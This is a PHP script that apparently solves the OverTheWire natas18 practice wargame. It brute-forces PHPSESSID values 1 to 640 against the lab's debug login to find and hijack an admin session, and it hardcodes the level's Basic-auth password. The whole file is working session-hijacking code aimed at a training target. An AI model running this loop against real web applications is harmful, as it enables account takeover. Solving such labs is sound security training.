<?php

$url = "http://natas18.natas.labs.overthewire.org";

for ($i=1;$i<=640;$i++) {
    $headers = array(
        "Authorization: Basic ". base64_encode("natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"),
        "Cookie: PHPSESSID=" . $i);
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    //curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookies.txt');
    //curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookies.txt');
    $out = curl_exec($curl);

    echo "COUNT:Trying sessionID $i:...\n";
    $url = "http://natas18.natas.labs.overthewire.org/index.php?debug";
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, 1);
    //curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookies.txt');
    //curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookies.txt');
    curl_setopt($curl, CURLOPT_POSTFIELDS, "username=admin&password=1");
    $out = curl_exec($curl);
    echo $out;
}

curl_close($curl);